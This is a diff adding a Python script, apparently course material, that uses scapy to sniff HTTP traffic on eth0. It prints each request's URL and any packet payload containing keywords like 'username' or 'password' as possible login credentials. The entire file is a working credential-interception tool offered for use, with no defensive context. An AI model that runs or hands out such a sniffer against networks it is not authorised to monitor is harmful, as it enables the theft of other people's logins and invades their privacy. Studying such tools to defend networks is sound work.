@@ -1,0 +1,33 @@
+    1 	#! /usr/bin/env python
+    2 	
+    3 	import scapy.all as scapy
+    4 	from scapy.layers import http  
+    5 	
+    6 	
+    7 	def sniff(interface):
+    8 	    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    9 	
+   10 	
+   11 	def get_url(packet):
+   12 	    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+   13 	
+   14 	
+   15 	def get_login_info(packet):
+   16 	    if packet.haslayer(scapy.Raw):  # the raw layer has the usrname and password, always use scapy.layername
+   17 	        load = str(packet[scapy.Raw].load)
+   18 	        keywords = ["username", "uname", "user", "login", "password","pass"]  # to create a list of keywords to look for substrings
+   19 	        for keyword in keywords:  # for each found keyword in the list do the following
+   20 	            if keyword in load:
+   21 	                return load
+   22 	
+   23 	
+   24 	def process_sniffed_packet(packet):
+   25 	    if packet.haslayer(http.HTTPRequest):  # to filter and print only http packet
+   26 	        url = get_url(packet)
+   27 	        print("[+] HTTP Request >> " + url.decode())
+   28 	        login_info = get_login_info(packet)
+   29 	        if login_info:
+   30 	            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
+   31 	
+   32 	
+   33 	sniff("eth0")
